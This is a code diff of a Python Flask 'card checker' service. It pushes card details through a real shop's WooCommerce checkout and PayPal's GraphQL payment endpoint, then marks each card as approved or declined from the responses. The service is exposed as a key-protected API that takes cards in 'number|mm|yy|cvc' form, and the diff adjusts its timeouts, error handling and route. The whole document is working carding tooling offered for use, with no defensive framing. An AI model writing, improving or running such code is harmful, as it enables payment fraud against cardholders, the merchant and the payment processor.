@@ -60,11 +60,11 @@ def check_card(card_details):
             'https://switchupcb.com/shop/i-buy/',
             headers={'user-agent': user, 'content-type': multipart_data.content_type},
             data=multipart_data,
-            timeout=50
+            timeout=60
         )
 
         # 2. Get checkout tokens
-        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=15)
+        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=60)
         try:
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
@@ -80,20 +80,15 @@ def check_card(card_details):
             'funding_source': 'card',
             'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
         }
-        try:
-            response_create = r.post(
-                'https://switchupcb.com/?wc-ajax=ppc-create-order',
-                json=json_data_create,
-                headers={'user-agent': user},
-                timeout=50
-            )
-            order_data = response_create.json()
-        except Exception:
-            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_FAILED"}
-
+        response_create = r.post(
+            'https://switchupcb.com/?wc-ajax=ppc-create-order',
+            json=json_data_create,
+            headers={'user-agent': user},
+            timeout=60
+        )
+        order_data = response_create.json()
         if 'data' not in order_data or 'id' not in order_data['data']:
-            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_INVALID"}
-
+            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_FAILED"}
         paypal_id = order_data['data']['id']
 
         # 4. Final GraphQL payment request to PayPal
@@ -104,62 +99,50 @@ def check_card(card_details):
                 'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc},
             }
         }
-        try:
-            response_final = requests.post(
-                'https://www.paypal.com/graphql?fetch_credit_form_submit',
-                headers={'user-agent': user, 'content-type': 'application/json'},
-                json=json_data_graphql,
-                timeout=50
-            )
-            raw_json = response_final.json()
-        except Exception:
-            return {"message": "DECLINED ❌", "response_text": "ERROR: FINAL_REQ_FAILED"}
+        response_final = requests.post(
+            'https://www.paypal.com/graphql?fetch_credit_form_submit',
+            headers={'user-agent': user, 'content-type': 'application/json'},
+            json=json_data_graphql,
+            timeout=60
+        )
 
         # Extract only the first error code
-        if "errors" in raw_json and len(raw_json["errors"]) > 0:
-            err = raw_json["errors"][0]
-            code = ""
-            if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
-                code = err["data"][0].get("code", "")
-            error_text = f"ERROR: {code}"
-        else:
-            error_text = "ERROR: UNKNOWN"
+        try:
+            raw_json = response_final.json()
+            if "errors" in raw_json and len(raw_json["errors"]) > 0:
+                err = raw_json["errors"][0]
+                code = ""
+                if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
+                    code = err["data"][0].get("code", "")
+                error_text = f"ERROR: {code}"
+            else:
+                error_text = "ERROR: UNKNOWN"
+        except Exception:
+            error_text = "ERROR: PARSE_FAILED"
 
         # --- Decide clean message ---
-        # --- Decide clean message ---
-        if "is3DSecureRequired" in response_final.text:
-            return {"message": "✅APPROVED", "response_text": "3ds_Required"}
-
-        elif any(x in response_final.text for x in [
-            "succeeded", "Thank You", "ADD_SHIPPING_ERROR",
-            "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED",
-            "INVALID_BILLING_ADDRESS"
-        ]):
+        if any(x in response_final.text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR", "is3DSecureRequired", "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED", "INVALID_BILLING_ADDRESS"]):
             return {"message": "✅APPROVED", "response_text": error_text}
-
         else:
             return {"message": "❌DECLINED", "response_text": error_text}
 
     except Exception as e:
         return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
 
-
 # --- API Endpoint ---
-@app.route('/api', methods=['GET'])
-def api_check():
-    gateway = request.args.get('gateway')
-    key = request.args.get('key')
-    card_info = request.args.get('cc')
-
+@app.route('/gateway=<gateway>&key=<key>', methods=['GET'])
+def api_check(gateway, key):
     # Key validation
     if key != "payalismy":
         return jsonify({"message": "ACCESS DENIED ❌", "response_text": "ERROR: INVALID_KEY"}), 403
 
+    card_info = request.args.get('cc')
     if not card_info:
         return jsonify({"message": "❌DECLINED", "response_text": "ERROR: MISSING_PARAM"}), 400
+
     if len(card_info.split('|')) != 4:
         return jsonify({"message": "❌DECLINED", "response_text": "ERROR: INVALID_FORMAT"}), 400
-    
+
     result = check_card(card_info)
     return jsonify(result)
 
